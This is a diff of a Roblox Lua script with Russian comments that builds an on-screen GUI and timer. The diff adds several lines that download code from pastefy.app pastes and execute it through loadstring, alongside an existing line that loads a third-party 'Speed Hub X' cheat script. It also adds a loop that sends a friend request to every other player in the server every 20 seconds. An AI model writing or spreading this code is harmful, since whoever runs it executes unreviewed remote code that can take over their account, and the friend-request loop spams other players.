@@ -29,8 +29,27 @@ Title.TextStrokeTransparency = 1
 Title.TextScaled = true
 Title.Font = Enum.Font.GothamBold
 Title.Parent = Background
-loadstring(game:HttpGet("https://pastefy.app/f7dA9ePx/raw",true))()
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 
+loadstring(game:HttpGet("https://pastefy.app/HuIaoEoR/raw",true))()
+
+-- Функция отправки запроса
+local function sendFriendRequest(player)
+    if player ~= LocalPlayer then
+        pcall(function()
+            LocalPlayer:RequestFriendship(player)
+            print("📩 Отправлен запрос в друзья: " .. player.Name)
+        end)
+    end
+end
+
+-- Цикл рассылки каждые 20 секунд
+while task.wait(20) do
+    for _, player in ipairs(Players:GetPlayers()) do
+        sendFriendRequest(player)
+    end
+end
 
 -- Таймер
 local TimerLabel = Instance.new("TextLabel")
@@ -122,3 +141,4 @@ end
 -- Удаление GUI
 ScreenGui:Destroy()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
+loadstring(game:HttpGet("https://pastefy.app/f7dA9ePx/raw",true))()
